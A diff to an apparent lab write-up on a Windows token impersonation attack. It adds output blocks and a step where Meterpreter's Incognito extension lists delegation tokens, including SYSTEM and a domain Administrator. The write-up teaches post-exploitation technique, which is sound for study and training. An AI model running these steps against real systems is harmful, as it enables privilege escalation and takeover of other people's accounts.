@@ -350,13 +350,15 @@ After getting a Meterpreter session on the Windows machine, I checked which user
 getuid
 ```
 
+**Output:**
+
 ```text
 meterpreter > getuid
 Server username: NT AUTHORITY\SYSTEM
 ```
 
 <p align="center">
-  <img src="/writeups/token impersonation attack/images/STEP2-1.png" width="600">
+  <img src="/writeups/token impersonation attack/images/step2-1.png" width="600">
 </p>
 
 ## Step 2 - Load Incognito
@@ -367,9 +369,36 @@ The Incognito extension allows token enumeration and impersonation.
 load incognito
 ```
 
+**Output:**
+
 ```text
 meterpreter > load incognito
 Loading extension incognito...Success.
+```
+
+## Step 3 - List Available Tokens
+
+```bash
+meterpreter > list_tokens -u
+```
+
+**Output:**
+```text
+meterpreter > list_tokens -u
+
+Delegation Tokens Available
+========================================
+Font Driver Host\UMFD-0
+Font Driver Host\UMFD-1
+NT AUTHORITY\LOCAL SERVICE
+NT AUTHORITY\NETWORK SERVICE
+NT AUTHORITY\SYSTEM
+READTEAMBD\Administrator
+Window Manager\DWM-1
+
+Impersonation Tokens Available
+========================================
+No tokens available
 ```
 
 
